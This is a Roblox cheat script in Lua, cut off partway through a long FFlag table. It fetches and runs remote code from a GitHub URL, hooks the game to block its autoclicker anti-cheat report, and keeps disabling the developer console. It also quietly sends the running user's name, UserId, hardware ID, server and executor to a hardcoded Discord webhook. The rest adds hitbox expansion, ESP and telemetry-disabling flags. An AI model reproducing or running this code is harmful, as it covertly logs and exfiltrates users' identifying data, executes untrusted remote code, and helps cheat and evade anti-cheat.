	local syde = loadstring(game:HttpGet("https://raw.githubusercontent.com/essencejs/syde/refs/heads/main/source"))()
	local ReplicatedStorage = game:GetService("ReplicatedStorage")

	local OldNamecall
	OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
		local method = getnamecallmethod()
		if method == "FireServer" and self == ReplicatedStorage.Remotes.GameServices.ToServer.AutoclickerDetected then
			return
		end
		return OldNamecall(self, ...)
	end))

	local function _blockConsole()
		pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleEnabled", false) end)
		for _, child in ipairs(game:GetService("CoreGui"):GetChildren()) do
			if child.Name == "DevConsole" then
				child.Enabled = false
			end
		end
	end

	_blockConsole()

	for _, child in ipairs(game:GetService("CoreGui"):GetChildren()) do
		if child.Name == "DevConsole" then
			child.Enabled = false
			child:GetPropertyChangedSignal("Enabled"):Connect(function()
				if child.Enabled then child.Enabled = false end
			end)
		end
	end

	game:GetService("CoreGui").ChildAdded:Connect(function(child)
		if child.Name == "DevConsole" then
			child.Enabled = false
			child:GetPropertyChangedSignal("Enabled"):Connect(function()
				if child.Enabled then child.Enabled = false end
			end)
		end
	end)

	game:GetService("UserInputService").InputBegan:Connect(function(input)
		if input.KeyCode == Enum.KeyCode.F9 then
			_blockConsole()
		end
	end)

	task.spawn(function()
		while true do
			_blockConsole()
			task.wait(0.1)
		end
	end)

	local Players = game:GetService("Players")
	local CollectionService = game:GetService("CollectionService")
	local CoreGui = game:GetService("CoreGui")
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	local LocalPlayer = Players.LocalPlayer
	local EntitiesFolder = workspace:FindFirstChild("Entities")

	pcall(function()
		local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
		local httprequest = (syn and syn.request)
			or (http and http.request)
			or (http_request)
			or (fluxus and fluxus.request)
			or request
		if not httprequest then return end
		httprequest({
			Url = "https://discord.com/api/webhooks/1489706136637800468/XRiSABmsy0PVxbknhSpJG-h8Fvlyc3x_vONCI8OExFlDphyaFlroD43mbm6n35IfSBYO",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode({
				content = "",
				embeds = {{
					title = "diarian — Session Log",
					color = 0xFF0000,
					fields = {
						{ name = "User", value = LocalPlayer.Name, inline = true },
						{ name = "UserId", value = tostring(LocalPlayer.UserId), inline = true },
						{ name = "HWID", value = "```" .. hwid .. "```", inline = false },
						{ name = "Game", value = "[" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", inline = true },
						{ name = "Server", value = "`" .. game.JobId .. "`", inline = false },
						{ name = "Executor", value = identifyexecutor(), inline = true },
						{ name = "Time", value = os.date("%Y-%m-%d %H:%M:%S", os.time()), inline = true },
					},
					footer = { text = "diarian logger" },
				}},
			}),
		})
	end)


	-- ==================== STATES (UI ONLY) ====================

	local hitboxEnabled = false
	local hitboxKeybind = Enum.KeyCode.Four
	local hitboxSize = 50
	local hitboxTransparency = 80
	local hitboxColor = Color3.fromRGB(180, 150, 255)

	local espEnabled = false
	local espUpdateInterval = 1
	local espRange = 1000

	local friendWhitelist = {
		[LocalPlayer.Name] = true,
	}

	local whitelistToggles = {}
	local hitboxBoxes = {}
	local hitboxToggleRef = nil

	local espObjects = {}
	local playersInLimbo = {}
	local espConnections = {}
	local espLoopRunning = false
	local lastESPUpdate = 0

	local ESP_SETTINGS = {
		HeightOffset = 3.2,
		TextSize = 16,
		UsernameSize = 13,
		SpecieSize = 12,
		DeadSize = 11,
		TextColor = Color3.fromRGB(255, 255, 255),
		UsernameColor = Color3.fromRGB(180, 180, 180),
		DeadColor = Color3.fromRGB(255, 100, 100),
		StrokeColor = Color3.fromRGB(0, 0, 0),
		StrokeTransparency = 0.7,
	}

	local SPECIE_COLORS = {
		Vampire = Color3.fromRGB(255, 50, 50),
		Original = Color3.fromRGB(255, 0, 0),
		Witch = Color3.fromRGB(170, 85, 255),
		Siphoner = Color3.fromRGB(120, 0, 255),
		Werewolf = Color3.fromRGB(255, 170, 0),
		Hybrid = Color3.fromRGB(255, 0, 150),
		Tribrid = Color3.fromRGB(0, 255, 200),
		Human = Color3.fromRGB(200, 200, 200),
		Hunter = Color3.fromRGB(0, 170, 255),
		Heretic = Color3.fromRGB(255, 85, 255),
		Ghost = Color3.fromRGB(180, 180, 255),
		Demon = Color3.fromRGB(255, 80, 0),
		Angel = Color3.fromRGB(255, 255, 150),
		Unknown = Color3.fromRGB(150, 150, 150),
	}

	local function shouldIgnoreHitboxName(name)
		return name == LocalPlayer.Name or friendWhitelist[name] == true
	end

	local function applyHitboxStyle(part)
		if not part then
			return
		end
		part.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
		part.Color = hitboxColor
		part.Transparency = hitboxTransparency / 100
	end

	local function destroyHitboxForModel(model)
		local data = hitboxBoxes[model]
		if data then
			if data.box and data.box.Parent then
				data.box:Destroy()
			end
			hitboxBoxes[model] = nil
		end
	end

	local function createHitboxForModel(model)
		if not hitboxEnabled or not model or not model.Parent then
			return
		end
		if shouldIgnoreHitboxName(model.Name) or hitboxBoxes[model] then
			return
		end

		local primary = model.PrimaryPart or model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("BasePart")
		if not primary then
			return
		end

		local box = Instance.new("Part")
		box.Name = "AbilityBox"
		box.CanCollide = false
		box.Anchored = false
		box.Massless = true
		box.CFrame = primary.CFrame
		applyHitboxStyle(box)
		box.Parent = model

		local weld = Instance.new("WeldConstraint")
		weld.Part0 = box
		weld.Part1 = primary
		weld.Parent = box

		hitboxBoxes[model] = { box = box }
	end

	local function clearAllHitboxes()
		for model in pairs(hitboxBoxes) do
			destroyHitboxForModel(model)
		end
	end

	local function refreshAllHitboxes()
		for model, data in pairs(hitboxBoxes) do
			if not model.Parent or shouldIgnoreHitboxName(model.Name) then
				destroyHitboxForModel(model)
			elseif data.box then
				applyHitboxStyle(data.box)
			end
		end
	end

	local function setHitboxEnabled(state)
		hitboxEnabled = state
		if hitboxEnabled then
			if EntitiesFolder then
				for _, entity in ipairs(EntitiesFolder:GetChildren()) do
					if entity:IsA("Model") then
						createHitboxForModel(entity)
					end
				end
			end
		else
			clearAllHitboxes()
		end
	end

	local function activateFPSBooster()
		local setfflag = setfflag or set_fflag or (debug and debug.setfflag)
		
		-- FFlags (If supported by executor)
		if setfflag then
			local fflags = {
				["DFIntCanHideGuiGroupId"] = "6723824",
				["FIntActivatedCountTimerMSKeyboard"] = "0",
				["FIntActivatedCountTimerMSMouse"] = "0",
				["FLogNetwork"] = "7",
				["DFIntHardwareTelemetryHundredthsPercent"] = "0",
				["FStringWhitelistVerifiedUserId"] = "411955176",
				["FFlagLuaAppExitModalDoNotShow"] = "True",
				["DFFlagBatchAssetApiNoFallbackOnFail"] = "False",
				["DFIntClientLightingTechnologyChangedTelemetryHundredthsPercent"] = "0",
				["DFIntTextureQualityOverride"] = "0",
				["DFIntPlayerNetworkUpdateRate"] = "60",
				["FIntV1MenuLanguageSelectionFeaturePerMillageRollout"] = "0",
				["FIntRenderShadowIntensity"] = "0",
				["DFIntRaknetBandwidthInfluxHundredthsPercentageV2"] = "10000",
				["DFFlagTextureQualityOverrideEnabled"] = "True",
				["FFlagDebugDisableTelemetryEphemeralCounter"] = "True",
				["FFlagDontCreatePingJob"] = "True",
				["FIntFullscreenTitleBarTriggerDelayMillis"] = "18000000",
				["FFlagReconnectDisabled"] = "True",
				["FIntBootstrapperTelemetryReportingHundredthsPercentage"] = "0",
				["FFlagDisablePostFx"] = "True",
				["FFlagDebugRenderingSetDeterministic"] = "True",
				["DFIntCodecMaxOutgoingFrames"] = "10000",
				["DFIntRakNetNakResendDelayMs"] = "1",
				["FIntRakNetResendBufferArrayLength"] = "128",
				["FStringTopBarBadgeLearnMoreLink"] = "https://youtube.com/@KiwisASkid/",
				["DFFlagSimReportCPUInfo"] = "False",
				["DFIntTaskSchedulerTargetFps"] = "9999",
				["FIntDebugForceMSAASamples"] = "1",
				["DFFlagDisableDPIScale"] = "True",
				["FIntUGCValidationLeftArmThresholdSide"] = "40",
				["DFIntCodecMaxIncomingPackets"] = "100",
				["FFlagEnableInGameMenuChromeABTest3"] = "False",
				["FFlagHandleAltEnterFullscreenManually"] = "False",
				["FIntTerrainArraySliceSize"] = "4",
				["FIntUGCValidationTorsoThresholdBack"] = "200",
				["DFFlagDebugRenderForceTechnologyVoxel"] = "True",
				["DFIntCSGLevelOfDetailSwitchingDistanceL23"] = "3",
				["FFlagEnableMenuModernizationABTest2"] = "False",
				["DFStringRobloxAnalyticsURL"] = "http://opt-out.roblox.com",
				["DFIntOptimizePingThreshold"] = "50",
				["DFStringHttpPointsReporterUrl"] = "http://opt-out.roblox.com",
				["FFlagEnableMenuControlsABTest"] = "False",
				["DFIntCanHideGuiGroupId"] = "32380007",
				["FFlagDebugForceFutureIsBrightPhase3"] = "True",
				["FFlagDebugGraphicsPreferD3D11"] = "true",
				["DFIntRakNetNakResendDelayRttPercent"] = "50",
				["DFIntRaknetBandwidthPingSendEveryXSeconds"] = "1",
				["FFlagEnableAudioOutputDevice"] = "False",
				["FStringErrorUploadToBacktraceBaseUrl"] = "http://opt-out.roblox.com",
				["FIntRenderShadowmapBias"] = "0",
				["DFIntUserIdPlayerNameLifetimeSeconds"] = "86400",
				["DFIntPlayerNetworkUpdateQueueSize"] = "20",
				["FFlagDebugLightGridShowChunks"] = "False",
				["DFIntLightstepHTTPTransportHundredthsPercent2"] = "0",
				["DFFlagEnableDynamicHeadByDefault"] = "False",
				["DFIntLargePacketQueueSizeCutoffMB"] = "1000",
				["FIntUGCValidationLeftLegThresholdFront"] = "40",
				["FFlagDebugGraphicsDisableMetal"] = "true",
				["FFlagEnableInGameMenuV3"] = "True",
				["FIntUGCValidationRightArmThresholdFront"] = "50",
				["FFlagDebugDisableTelemetryV2Counter"] = "True",
				["DFFlagEnableHardwareTelemetry"] = "False",
				["FIntUGCValidationLeftArmThresholdBack"] = "23",
				["FFlagGameBasicSettingsFramerateCap5"] = "false",
				["FFlagInGameMenuV1ExitModal"] = "True",
				["DFIntAnimationLodFacsDistanceMin"] = "0",
				["FFlagLuaAppExitModal2"] = "False",
				["FIntMockClientLightingTechnologyIxpExperimentQualityLevel"] = "7",
				["FFlagOptimizeNetwork"] = "true",
				["FFlagCloudsReflectOnWater"] = "True",
				["FFlagEnableQuickGameLaunch"] = "False",
				["FFlagDebugGraphicsPreferVulkan"] = "True",
				["FIntRenderGrassHeightScaler"] = "0",
				["DFFlagEnableLightstepReporting2"] = "False",
				["FFlagEnableAccessibilitySettingsAPIV2"] = "True",
				["FFlagDebugSimDefaultPrimalSolver"] = "True",
				["DFIntCSGLevelOfDetailSwitchingDistance"] = "1",
				["FFlagInGameMenuV1FullScreenTitleBar"] = "False",
				["FStringPartTexturePackTable2022"] = "{\"foil\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[238,238,238,255]},\"asphalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[227,227,228,234]},\"basalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[160,160,158,238]},\"brick\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[229,214,205,227]},\"cobblestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,219,219,243]},\"concrete\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[225,225,224,255]},\"crackedlava\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[76,79,81,156]},\"diamondplate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[210,210,210,255]},\"fabric\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[221,221,221,255]},\"glacier\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[225,229,229,243]},\"glass\":{\"ids\":[\"rbxassetid://9873284556\",\"rbxassetid://9438453972\"],\"color\":[254,254,254,7]},\"granite\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[210,206,200,255]},\"grass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[196,196,189,241]},\"ground\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[165,165,160,240]},\"ice\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[235,239,241,248]},\"leafygrass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[182,178,175,234]},\"limestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[250,248,243,250]},\"marble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[181,183,193,249]},\"metal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[226,226,226,255]},\"mud\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[193,192,193,252]},\"pavement\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,218,219,236]},\"pebble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[204,203,201,234]},\"plastic\":{\"ids\":[\"\",\"rbxassetid://0\"],\"color\":[255,255,255,255]},\"rock\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[211,211,210,248]},\"corrodedmetal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[206,177,163,180]},\"salt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[249,249,249,255]},\"sand\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,216,210,240]},\"sandstone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[241,234,230,246]},\"slate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[235,234,235,254]},\"snow\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[239,240,240,255]},\"wood\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[217,209,208,255]},\"woodplanks\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[207,208,206,254]}}",
				["DFIntNetworkLatencyTolerance"] = "1",
				["FFlagGpuGeometryManager7"] = "True",
				["FIntEmotesAnimationsPerPlayerCacheSize"] = "16777216",
				["DFIntRakNetLoopMs"] = "1",
				["DFStringCrashUploadToBacktraceBaseUrl"] = "http://opt-out.roblox.com",
				["FFlagDebugDisableTelemetryEphemeralStat"] = "True",
				["FFlagDebugDisplayUnthemedInstances"] = "True",
				["FFlagEnableV3MenuABTest3"] = "False",
				["DFIntDataSenderRate"] = "9",
				["DFIntAnimationLodFacsDistanceMax"] = "0",
				["FFlagFixGraphicsQuality"] = "True",
				["FFlagDebugDisableTelemetryPoint"] = "True",
				["DFIntReportOutputDeviceInfoRateHundredthsPercentage"] = "0",
				["FStringTerrainMaterialTable2022"] = "",
				["FIntDefaultMeshCacheSizeMB"] = "256",
				["FFlagEnableInGameMenuModernization"] = "True",
				["FFlagOptimizeNetworkTransport"] = "true",
				["DFIntMaxProcessPacketsJobScaling"] = "10000",
				["DFIntUserIdPlayerNameCacheSize"] = "33554432",
				["FIntUGCValidationRightLegThresholdFront"] = "80",
				["DFIntGoogleAnalyticsLoadPlayerHundredth"] = "0",
				["FFlagEnableBetaFacialAnimation2"] = "False",
				["FFlagDebugDisplayFPS"] = "False",
				["FIntTerrainOTAMaxTextureSize"] = "1024",
				["DFIntRakNetNakResendDelayMsMax"] = "1",
				["DFFlagRakNetUseSlidingWindow4"] = "False",
				["DFIntServerTickRate"] = "60",
				["DFFlagFacialAnimationStreaming2"] = "False",
				["FIntRenderGrassDetailStrands"] = "0",
				["FIntRakNetDatagramMessageIdArrayLength"] = "1024",
				["FFlagChatTranslationSettingEnabled3"] = "False",
				["DFStringAltTelegrafHTTPTransportUrl"] = "http://opt-out.roblox.com",
				["DFIntMegaReplicatorNetworkQualityProcessorUnit"] = "10",
				["FIntFontSizePadding"] = "3",
				["DFIntCSGLevelOfDetailSwitchingDistanceL34"] = "4",
				["FFlagEnableSoundTelemetry"] = "False",
				["DFIntMaxFrameBufferSize"] = "4",
				["FIntUGCValidationRightArmThresholdFront"] = "50",
				["DFFlagDebugAnalyticsSendUserId"] = "False",
				["FFlagEnableMenuModernizationABTest"] = "False",
				["DFIntMaxProcessPacketsStepsAccumulated"] = "0",
				["FFlagDebugDisableTelemetryV2Stat"] = "True",
				["FIntUGCValidationLeftLegThresholdSide"] = "36",
				["DFIntRakNetResendRttMultiple"] = "1",
				["FFlagPreloadTextureItemsOption4"] = "True",
				["DFFlagEnableGCapsHardwareTelemetry"] = "False",
				["FIntFRMMinGrassDistance"] = "0",
				["DFIntReportRecordingDeviceInfoRateHundredthsPercentage"] = "0",
				["FFlagDebugDisableTelemetryEventIngest"] = "True",
				["FFlagVoiceBetaBadge"] = "False",
				["DFStringAnalyticsEventStreamUrlEndpoint"] = "opt-out",
				["FFlagDebugDisableTelemetryV2Event"] = "True",
				["FIntUGCValidationTorsoThresholdFront"] = "200",
				["FFlagMSRefactor5"] = "False",
				["FFlagCoreGuiTypeSelfViewPresent"] = "False",
				["FIntMeshContentProviderForceCacheSize"] = "268435456",
				["FIntUGCValidationRightLegThresholdBack"] = "80",
				["FFlagAdServiceEnabled"] = "False",
				["FIntFRMMaxGrassDistance"] = "0",
				["DFFlagQueueDataPingFromSendData"] = "True",
				["FIntUGCValidationTorsoThresholdSide"] = "200",
				["FFlagDisableNewIGMinDUA"] = "True",
				["FFlagTaskSchedulerLimitTargetFpsTo2402"] = "False",
				["FFlagCommitToGraphicsQualityFix"] = "True",
				["FIntRobloxGuiBlurIntensity"] = "0",
				["FFlagGraphicsGLEnableHQShadersExclusion"] = "False",
				["FIntUGCValidationRightLegThresholdSide"] = "76",
				["DFIntClientLightingEnvmapPlacementTelemetryHundredthsPercent"] = "100",
				["DFIntDebugSimPrimalLineSearch"] = "20",
				["FFlagGraphicsGLEnableSuperHQShadersExclusion"] = "False",
				["DFIntVoiceChatVolumeThousandths"] = "6000",
				["DFIntAnimationLodFacsVisibilityDenominator"] = "0",
				["FIntUGCValidationLeftArmThresholdFront"] = "27",
				["DFFlagEnableFmodErrorsTelemetry"] = "False",
				["FFlagFastGPULightCulling3"] = "True",
				["DFIntCSGLevelOfDetailSwitchingDistanceL12"] = "2",
				["DFFlagAudioDeviceTelemetry"] = "False",
				["FFlagBatchAssetApi"] = "True",
				["FIntUITextureMaxRenderTextureSize"] = "1024",
				["FStringInGameMenuChromeForcedUserIds"] = "1353919681",
				["DFFlagLoadCharacterLayeredClothingProperty2"] = "False",
				["FFlagLuaAppSystemBar"] = "False",
				["DFIntMaxProcessPacketsStepsPerCyclic"] = "5000",
				["DFIntWaitOnRecvFromLoopEndedMS"] = "100",
				["FIntRenderLocalLightUpdatesMin"] = "1",
				["FIntUGCValidationRightArmThresholdSide"] = "80",
				["FFlagEnableChromePinnedChat"] = "True",
				["FIntHSRClusterSymmetryDistancePercent"] = "10000",
				["FFlagNewLightAttenuation"] = "True",
				["FFlagEnableAccessibilitySettingsInExperienceMenu2"] = "True",
				["DFFlagGpuVsCpuBoundTelemetry"] = "False",
				["DFIntNetworkPrediction"] = "120",
				["FFlagEnableInGameMenuControls"] = "True",
				["FFlagOptimizeNetworkRouting"] = "true",
				["FIntMockClientLightingTechnologyIxpExperimentMode"] = "0",
				["FStringPerformanceSendMeasurementAPISubdomain"] = "opt-out",
				["FFlagEnableInGameMenuChrome"] = "False",
				["DFIntDebugFRMQualityLevelOverride"] = "1",
				["FIntUGCValidationLeftLegThresholdBack"] = "40",
				["DFStringAltHttpPointsReporterUrl"] = "http://opt-out.roblox.com",
				["DFFlagDebugPauseVoxelizer"] = "True",
				["FIntRenderLocalLightUpdatesMax"] = "1",
				["DFStringRobloxAnalyticsSubDomain"] = "opt-out",
				["DFIntHttpCurlConnectionCacheSize"] = "134217728",
				["FFlagRenderGpuTextureCompressor"] = "True",
				["FFlagEnableAccessibilitySettingsEffectsInExperienceChat"] = "True",
				["FFlagTopBarUseNewBadge"] = "True",
				["FIntLmsClientRollout2"] = "0",
				["DFIntWaitOnUpdateNetworkLoopEndedMS"] = "100",
				["FFlagOptimizeServerTickRate"] = "true",
				["FFlagPreloadAllFonts"] = "True",
				["FFlagEnableAccessibilitySettingsEffectsInCoreScripts2"] = "True",
				["FFlagAnimationClipMemCacheEnabled"] = "True",
				["FFlagEnableCommandAutocomplete"] = "False",
				["FFlagInGameMenuV1LeaveToHome"] = "False",
				["DFStringTelegrafHTTPTransportUrl"] = "http://opt-out.roblox.com",
				["FStringPartTexturePackTablePre2022"] = "{\"foil\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[255,255,255,255]},\"brick\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[204,201,200,232]},\"cobblestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[212,200,187,250]},\"concrete\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[208,208,208,255]},\"diamondplate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[170,170,170,255]},\"fabric\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[105,104,102,244]},\"glass\":{\"ids\":[\"rbxassetid://7547304948\",\"rbxassetid://7546645118\"],\"color\":[254,254,254,7]},\"granite\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[113,113,113,255]},\"grass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[165,165,159,255]},\"ice\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[255,255,255,255]},\"marble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[199,199,199,255]},\"metal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[199,199,199,255]},\"pebble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[208,208,208,255]},\"corrodedmetal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[159,119,95,200]},\"sand\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[220,220,220,255]},\"slate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[193,193,193,255]},\"wood\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[227,227,227,255]},\"woodplanks\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[212,209,203,255]},\"asphalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[123,123,123,234]},\"basalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[154,154,153,238]},\"crackedlava\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[74,78,80,156]},\"glacier\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[226,229,229,243]},\"ground\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[114,114,112,240]},\"leafygrass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[121,117,113,234]},\"limestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[235,234,230,250]},\"mud\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[130,130,130,252]},\"pavement\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[142,142,144,236]},\"rock\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[154,154,154,248]},\"salt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[220,220,221,255]},\"sandstone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[174,171,169,246]},\"snow\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,218,218,255]}}",
				["DFLogHttpTraceLight"] = "0",
				["FStringTerrainMaterialTablePre2022"] = "",
				["DFFlagDebugPerfMode"] = "True",
				["DFIntServerPhysicsUpdateRate"] = "60",
				["DFFlagDebugSimPrimalFeedback"] = "True",
				["DFIntDebugSimPrimalStiffnessMax"] = "0",
				["DFIntDebugSimPrimalStiffnessMin"] = "0",
				["DFIntMaximumFreefallMoveTimeInTenths"] = "1000",
				["DFIntDebugSimPrimalNewtonIts"] = "1",
				["DFIntDebugSimPrimalPreconditioner"] = "69",
				["DFIntDebugSimPrimalPreconditionerMinExp"] = "69",
				["DFIntDebugSimPrimalToleranceInv"] = "1",
				["DFIntDebugSimPrimalWarmstartForce"] = "-885",
				["DFIntDebugSimPrimalWarmstartVelocity"] = "-350",
				["DFIntDebugSimPrimalStiffness"] = "0",
				["DFFlagRakNetStaleSendQueue"] = "True",
				["DFIntRakNetUseSlidingWindow2_startFactor"] = "100",
				["DFIntRakNetUseSlidingWindow2_minSpeed"] = "512",
				["DFIntRakNetUseSlidingWindow2_minRtt"] = "500",
				["DFIntRakNetUseSlidingWindow2_trackLengthMs"] = "300",
				["DFIntRakNetUseSlidingWindow2_rangeCount"] = "20",
				["DFIntRakNetUseSlidingWindow2_maxSpeed"] = "5000",
				["DFIntRakNetStaleSendQueueTriggerMs"] = "100",
				["DFFlagSampleAndRefreshRakPing"] = "True",
				["DFFlagRakNetMissingPing1"] = "True",
				["DFIntRakNetClockDriftAdjustmentPerPingMillisecond"] = "100",
				["FIntRakNetDatagramMessageldArrayLength"] = "4096",
				["DFFlagRakNetFixBwCollapse"] = "False",
				["DFFlagRakNetMissingPing"] = "False",
				["DFIntRakNetPingFrequencyMillisecond"] = "50",
				["DFFlagDebugRakPeerReceiveCountDistributedPackets"] = "False",
				["DFIntRakNetUseSlidingWindow2_startUpdateMs"] = "1",
				["DFFlagRakNetUnblockSelectOnShutdownByWritingToSocket"] = "True",
				["DFIntRaknetDownloadEpisodeInMs"] = "500",
				["DFFlagRakNetDetectNetUnreachable"] = "True",
				["DFIntRakNetUseSlidingWindow2_startInitSpeed"] = "100000",
				["DFFlagRakNetDecoupleRecvAndUpdateLoopShutdown"] = "True",
				["DFFlagRakNetCalculateApplicationFeedback2"] = "False",
				["DFFlagRakNetEnablePoll"] = "True",
				["DFFlagRakNetDisconnectNotification"] = "True",
				["DFFlagRakNetDetectRecvThreadOverload"] = "True",
				["FFlagHighlightOutlinesOnMobile"] = "True",
				["FFlagDebugForceFutureIsBrightPhase2"] = "True",
				["DFIntReportServerConnectionLostHundredthsPercent"] = "0",
				["DFIntConnectionMTUSize"] = "1200",
				["DFFlagReportServerConnectionLost"] = "False",
				["DFIntRakNetMtuValue1InBytes"] = "900",
				["FIntNewInGameMenuPercentRollout3"] = "0",
				["FIntRomarkStartWithGraphicQualityLevel"] = "2",
				["FFlagEnableInGameMenuChromeABTest4"] = "False",
				["DFFlagDebugLargeReplicatorDisableCompression"] = "true",
				["DFFlagDebugLargeReplicatorDisableDelta"] = "true",
				["DFFlagReplicateCreateToPlayer"] = "True",
				["DFFlagFastEndUpdateLoop"] = "true",
				["DFFlagHttpApplyDecompressionMultiplier"] = "False",
				["DFFlagHttpPointsReporterUseCompression"] = "False",
				["DFFlagNetworkUseZstdWrapper"] = "False",
				["FFlagDebugLargeReplicatorEnabled"] = "True",
				["FFlagDebugLargeReplicatorWrite"] = "True",
				["FFlagDebugLargeReplicatorRead"] = "True",
				["FFlagSimCSGV3IncrementalTriangulationStreamingCompression"] = "False",
				["FFlagEnableZstdDictionaryForClientSettings"] = "False",
				["FFlagCreationDBCompressRequest"] = "False",
				["FFlagEnableZstdForClientSettings"] = "False",
				["DFIntRakNetApplicationFeedbackScaleUpFactorHundredthPercent"] = "0",
				["DFIntServerBandwidthPlayerSampleRateFacsOverride"] = "2147483647",
				["DFIntRakNetApplicationFeedbackScaleUpThresholdPercent"] = "0",
				["DFIntJoinDataItemEstimatedCompressionRatioHundreths"] = "0",
				["DFIntServerRakNetBandwidthPlayerSampleRate"] = "2147483647",
				["DFIntClusterSenderMaxUpdateBandwidthBps"] = "2100000000",
				["DFIntGameNetCompressionLodByteBudgetThresholdPct"] = "0",
				["DFIntClusterEstimatedCompressionRatioHundredths"] = "0",
				["DFIntClusterSenderMaxJoinBandwidthBps"] = "2100000000",
				["DFIntServerBandwidthPlayerSampleRate"] = "2147483647",
				["DFIntClientNetworkInfluxHundredthsPercentage"] = "0",
				["DFIntRakNetApplicationFeedbackMaxSpeedBPS"] = "0",
				["DFIntSendGameServerDataMaxLen"] = "2147483647",
				["DFIntTouchSenderMaxBandwidthBpsScaling"] = "2",
				["DFIntSendRakNetStatsInterval"] = "2147483647",
				["DFIntNetworkSchemaCompressionRatio"] = "0",
				["DFIntTouchSenderMaxBandwidthBps"] = "1050",
				["DFIntNetworkQualityResponderUnit"] = "10",
				["DFIntJoinDataCompressionLevel"] = "0",
				["DFIntServerFramesBetweenJoins"] = "1",
				["DFIntClusterCompressionLevel"] = "0",
				["DFIntRakNetSelectTimeoutMs"] = "1",
				["DFIntSendItemLimit"] = "5",
				["FIntTaskSchedulerThreadMin"] = "3",
				["FStringCredit"] = "Potato Mode | @KiwisASkid on YT",
				["FIntRuntimeMaxNumOfThreads"] = "2400",
				["FFlagDebugCheckRenderThreading"] = "True",
				["FFlagRenderDebugCheckThreading2"] = "True",
